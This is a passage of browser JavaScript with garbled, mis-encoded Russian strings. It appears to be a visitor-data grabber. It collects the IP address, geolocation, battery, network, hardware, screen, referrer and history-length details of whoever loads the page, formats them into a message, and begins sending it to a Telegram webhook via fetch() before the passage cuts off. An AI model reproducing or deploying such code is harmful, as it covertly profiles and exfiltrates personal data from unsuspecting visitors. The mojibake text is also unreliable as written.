            let geoLocation = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";

            const screenBrightness = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"; // –ù–µ –≤—Å–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç —ç—Ç—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é

            const deviceMemory = navigator.deviceMemory || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";

            const screenWidth = screen.width;

            const colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? "–¢–µ–º–Ω–∞—è —Ç–µ–º–∞" : "–°–≤–µ—Ç–ª–∞—è —Ç–µ–º–∞";

            const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;

            const screenOrientation = screen.orientation ? screen.orientation.type : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";

            const message = `

üåê –ë—Ä–∞—É–∑–µ—Ä: ${browserName} ${browserVersion}
üåç –Ø–∑—ã–∫: ${language}
üíª –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${platform}
üç™ –í–∫–ª—é—á–µ–Ω—ã cookies: ${cookieEnabled}
‚òï –í–∫–ª—é—á–µ–Ω–∞ Java: ${javaEnabled}
üåê –°—Ç–∞—Ç—É—Å –æ–Ω–ª–∞–π–Ω: ${onlineStatus}

üåê –¢–∏–ø –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: ${connectionType}
üì∂ –°–∫–æ—Ä–æ—Å—Ç—å —Å–µ—Ç–∏: ${downlinkSpeed}
üïí –í—Ä–µ–º—è –∑–∞–¥–µ—Ä–∂–∫–∏ —Å–µ—Ç–∏ (RTT): ${rtt}

üó∫ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: ${geoLocation}
üîã –£—Ä–æ–≤–µ–Ω—å –±–∞—Ç–∞—Ä–µ–∏: ${batteryLevel}
üîå –°—Ç–∞—Ç—É—Å –∑–∞—Ä—è–¥–∫–∏: ${charging}

üíæ –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å: ${deviceMemory} GB
üß† –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞: ${hardwareConcurrency}
üì± –†–∞–∑–º–µ—Ä—ã —ç–∫—Ä–∞–Ω–∞: ${screenWidth}x${screenHeight}
üñ• –†–∞–∑–º–µ—Ä—ã –æ–∫–Ω–∞ –±—Ä–∞—É–∑–µ—Ä–∞: ${windowWidth}x${windowHeight}
üé® –¶–≤–µ—Ç–æ–≤–∞—è —Å—Ö–µ–º–∞: ${colorScheme}
            
üåê IP-–∞–¥—Ä–µ—Å: ${ipAddress}

üîó –ò—Å—Ç–æ—á–Ω–∏–∫ –ø–µ—Ä–µ—Ö–æ–¥–∞: ${referrer}
üìú –î–ª–∏–Ω–∞ –∏—Å—Ç–æ—Ä–∏–∏ –±—Ä–∞—É–∑–µ—Ä–∞: ${historyLength}
            
üì± –°–µ–Ω—Å–æ—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω: ${isTouchDevice ? "–î–∞" : "–ù–µ—Ç"}
üñ• –ü–æ–¥–¥–µ—Ä–∂–∫–∞ WebGL: ${hasWebGL ? "–î–∞" : "–ù–µ—Ç"}
üì± –ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${isMobile ? "–î–∞" : "–ù–µ—Ç"}
üß≠ –û—Ä–∏–µ–Ω—Ç–∞—Ü–∏—è —ç–∫—Ä–∞–Ω–∞: ${screenOrientation}

üì¶ –ü–æ–¥–¥–µ—Ä–∂–∫–∞ SessionStorage: ${sessionStorageSupported ? "–î–∞" : "–ù–µ—Ç"}
            `;

            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
            await fetch(webhookUrl, {
